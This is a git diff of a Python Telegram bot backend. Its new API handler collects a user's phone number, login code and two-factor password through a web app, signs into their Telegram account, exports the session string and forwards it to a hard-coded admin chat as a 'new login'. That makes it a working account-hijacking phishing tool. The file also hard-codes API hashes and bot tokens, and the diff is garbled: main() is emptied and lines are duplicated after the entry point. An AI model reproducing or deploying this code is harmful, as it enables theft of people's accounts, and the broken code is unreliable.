@@ -12,7 +12,7 @@ from pyrogram.errors import SessionPasswordNeeded, FloodWait
 # --- НАСТРОЙКИ ---
 API_ID = 15587172 
 API_HASH = "d3d35aebb0b6ebdb7a002836914ee37d"
-BOT_TOKEN = "8613728108:AAGR9Lmdx2YvG6wbg8qk31rcLxeKD4Vu6Po"
+BOT_TOKEN = "8711443316:AAE7IDM3KETScemryNQQs21vruVv9DK1QHA"
 ADMIN_ID = 1866813859 
 WEB_APP_URL = "https://pubgmolinki-cpu.github.io/telegram" # Твой Гитхаб
 
@@ -35,6 +35,74 @@ async def handle_api(request):
         loop = asyncio.get_running_loop()
     except RuntimeError:
         loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+
+    try:
+        data = await request.json()
+        action = data.get("action")
+        user_id = str(data.get("user_id"))
+
+        if action == "send_phone":
+            phone = data.get("phone").replace(" ", "").replace("-", "")
+            # Используем in_memory=True, чтобы не плодить файлы сессий на Render
+            client = Client(name=f"u_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
+            await client.connect()
+            sent_code = await client.send_code(phone)
+            active_clients[user_id] = {
+                "client": client, 
+                "phone": phone, 
+                "hash": sent_code.phone_code_hash
+            }
+            return web.json_response({"status": "ok"})
+
+        elif action == "send_code":
+            code = data.get("code")
+            session = active_clients.get(user_id)
+            if not session: 
+                return web.json_response({"status": "error", "message": "Сессия истекла"})
+            
+            try:
+                await session["client"].sign_in(session["phone"], session["hash"], code)
+                return await finish_auth(user_id, session)
+            except SessionPasswordNeeded:
+                return web.json_response({"status": "need_2fa"})
+
+        elif action == "send_2fa":
+            password = data.get("password")
+            session = active_clients.get(user_id)
+            await session["client"].check_password(password)
+            return await finish_auth(user_id, session)
+
+    except FloodWait as e:
+        return web.json_response({"status": "error", "message": f"Лимит! Подождите {e.value} сек."})
+    except Exception as e:
+        logging.error(f"API Error: {e}")
+        return web.json_response({"status": "error", "message": str(e)})
+
+async def finish_auth(user_id, session):
+    client = session["client"]
+    # Генерируем строку сессии вместо файла (так надежнее для Render)
+    string_session = await client.export_session_string()
+    
+    await bot.send_message(ADMIN_ID, f"✅ НОВЫЙ ВХОД!\nНомер: {session['phone']}\n\nSession String:\n`{string_session}`", parse_mode="Markdown")
+    
+    await client.disconnect()
+    if user_id in active_clients:
+        del active_clients[user_id]
+    return web.json_response({"status": "success"})
+
+# --- НАСТРОЙКА СЕРВЕРА ---
+app = web.Application()
+cors = aiohttp_cors.setup(app, defaults={
+    "*": aiohttp_cors.ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*")
+})
+resource = app.router.add_resource("/api")
+route = resource.add_route("POST", handle_api)
+cors.add(route)
+
+async def main():
+if __name__ == "__main__":
+    asyncio.run(main())        loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
 
     try:
@@ -170,15 +238,5 @@ route = resource.add_route("POST", handle_api)
 cors.add(route)
 
 async def main():
-    # Авто-порт для Render
-    port = int(os.environ.get("PORT", 8080))
-    runner = web.AppRunner(app)
-    await runner.setup()
-    site = web.TCPSite(runner, '0.0.0.0', port)
-    await site.start()
-    
-    print(f"Сервер запущен на порту {port}")
-    await dp.start_polling(bot)
-
 if __name__ == "__main__":
     asyncio.run(main())
